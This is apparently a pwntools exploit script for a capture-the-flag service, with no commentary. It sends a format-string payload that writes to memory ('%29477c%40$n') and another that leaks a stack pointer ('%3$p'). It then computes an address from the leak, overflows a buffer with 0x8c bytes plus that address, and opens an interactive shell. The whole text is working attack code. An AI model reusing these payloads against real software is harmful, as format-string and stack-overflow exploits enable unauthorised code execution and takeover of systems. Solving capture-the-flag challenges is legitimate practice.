io = remote('spdb-1.play.hfsc.tf', 40002)

r1 = b'%29477c%40$n'
io.sendlineafter(b'guess: ', r1)
r2 = b'%3$p'
io.sendlineafter(b'guess: ', r2)
a = int(io.recvline().split()[0],16)+0x7c
io.sendlineafter(b'guess: ', b'a'*0x8c+p32(a))
io.interactive()
